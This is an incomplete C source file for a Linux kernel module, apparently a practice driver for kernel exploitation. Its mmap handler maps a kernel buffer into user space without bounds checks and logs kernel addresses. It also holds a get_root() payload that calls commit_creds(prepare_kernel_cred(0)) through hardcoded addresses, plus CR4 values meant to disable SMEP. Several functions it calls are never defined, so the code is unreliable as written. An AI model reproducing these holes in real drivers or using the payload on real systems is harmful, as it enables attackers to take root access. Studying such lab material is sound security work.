#include <linux/miscdevice.h> 
#include <linux/delay.h> 
#include <linux/kernel.h> 
#include <linux/module.h> 
#include <linux/init.h> 
#include <linux/mm.h> 
#include <linux/fs.h> 
#include <linux/types.h> 
#include <linux/delay.h> 
#include <linux/moduleparam.h> 
#include <linux/slab.h> 
#include <linux/errno.h> 
#include <linux/ioctl.h> 
#include <linux/cdev.h> 
#include <linux/string.h> 
#include <linux/list.h> 
#include <linux/pci.h> 
#include <linux/gpio.h> 
 
 
//#define DEVICE_NAME "mymap" 
 
 
static unsigned char array[10]={0,1,2,3,4,5,6,7,8,9}; 
static unsigned long *buffer; 
void * ptr;
static void showdatemap(void* addr,int len){
		 if(1){
		 	printk(KERN_WARNING "[x]showdatemap start\n");
		 	unsigned long int* paddr=(unsigned long int*)addr;
		 	int i=0;
		 	//void **p=&&addr;
		 	for(;i<len;){
				//mdelay(1);
		 		printk(KERN_WARNING "[x]addr 0x%llx value 0x%llx  +8:0x%llx -8:0x%llx i:%d\n",(paddr+i),*(paddr+i),*(paddr+i+1),*(paddr+i-1),i);
				i=i+1;	 	
			}
		 	printk(KERN_WARNING "[x]showdatemap end\n");
		 }

	}
//size_t prepare_kernel_cred_addr=0xffffffc0000d2d60;
//size_t commit_creds_addr=0xffffffc0000d2800;
size_t native_write_cr4_addr=0x65a30;
size_t sys_ioctl_offset=0x22bc59;
size_t fake_cr4=0x407f0;

void get_root(void)
{
	size_t prepare_kernel_cred_addr=0xffffffc0000d2d60;
 	size_t commit_creds_addr=0xffffffc0000d2800;
	char* (*pkc)(int) = prepare_kernel_cred_addr;
	void (*cc)(char*) = commit_creds_addr;
	(*cc)((*pkc)(0));
}


static int get_time_show(void) 
{ 
	printk(KERN_WARNING "get_time_show not covered\n");
	printk(KERN_WARNING "we must covered this function in usermode\n");
	printk(KERN_WARNING "that will be mean kenrel code will be excute\n");

	printk(KERN_WARNING "get_time_show not covered\n");
	printk(KERN_WARNING "we must covered this function in usermode\n");
	printk(KERN_WARNING "that will be mean kenrel code will be excute\n");
	return 0;
} 
 
static int my_open(struct inode *inode, struct file *file) 
{ 
	return 0; 
} 
 
 
static int my_map(struct file *filp, struct vm_area_struct *vma) 
{ 
unsigned long page; 
unsigned char i; 
unsigned long start = (unsigned long)vma->vm_start; 
//unsigned long end = (unsigned long)vma->vm_end; 
unsigned long size = (unsigned long)(vma->vm_end - vma->vm_start); 
ptr=get_time_show;
//得到物理地址 
printk("get_time_show_ptr address: 0x%llx and buffer address: 0x%llx \n",&ptr,&buffer);
klog_sprintf("get_time_show_ptr address: 0x%llx and buffer address: 0x%llx \n",&ptr,&buffer);
showdatemap(&buffer,20);
showdate(&buffer,20);
page = virt_to_phys(buffer); //buffer
//将用户空间的一个vma虚拟内存区映射到以page开始的一段连续物理页面上 
if(remap_pfn_range(vma,start,page>>PAGE_SHIFT,size,PAGE_SHARED))//第三个参数是页帧号，由物理地址右移PAGE_SHIFT得到 
{
	printk("remap_pfn_range failed");

	return -1; 	
}

 
//往该内存写10字节数据 
//for(i=0;i<10;i++) 
//buffer[i] = array[i]; 
 
return 0; 
} 

